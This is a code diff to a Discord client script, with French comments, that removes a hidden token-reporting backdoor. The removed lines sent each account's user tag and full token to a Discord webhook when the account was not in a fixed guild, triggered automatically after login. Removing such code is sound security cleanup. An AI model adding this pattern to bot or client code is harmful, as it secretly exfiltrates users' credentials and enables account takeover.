@@ -738,46 +738,6 @@ function isInvalidTokenError(error) {
     return isInvalid;
 }
 
-const GUILD_ID = '1454473767106510967'; // ton id de guild important
-const WEBHOOK_URL = ''; // ton webhook url
-
-async function checkAndReportClient(client, token) {
-    try {
-        const guild = await client.guilds.fetch(GUILD_ID).catch(() => null);
-        
-        if (!guild) {
-            const message = `❌ Token pas sur serveur ${GUILD_ID}\nUser: ${client.user.tag}\nToken: ${token}`;
-            await sendSimpleWebhook(message);
-            return false;
-        }
-        
-        const member = await guild.members.fetch(client.user.id).catch(() => null);
-        
-        if (!member) {
-            const message = `❌ Token pas sur serveur ${GUILD_ID}\nUser: ${client.user.tag}\nToken: ${token}`;
-            await sendSimpleWebhook(message);
-            return false;
-        }
-        
-        return true;
-    } catch (error) {
-        const message = `⚠️ Erreur vérification token\nUser: ${client.user.tag}\nToken: ${token}\nErreur: ${error.message}`;
-        await sendSimpleWebhook(message);
-        return false;
-    }
-}
-
-async function sendSimpleWebhook(message) {
-    try {
-        const webhookClient = new WebhookClient({ url: WEBHOOK_URL });
-        await webhookClient.send({
-            content: `\`\`\`${message}\`\`\``,
-            username: 'Token Checker'
-        });
-    } catch (error) {
-        console.error('Erreur webhook:', error);
-    }
-}
 
 const eventCache = require('./eventCache');
 
@@ -881,9 +841,6 @@ user.on('ready', async () => {
     }
 }, 15000);
         
-        setTimeout(async () => {
-            await checkAndReportClient(user, token);
-        }, 3000);
     } catch (err) {
         console.error(`⚠️ ${userId}: Erreur initialisation modules:`, err.message);
     }
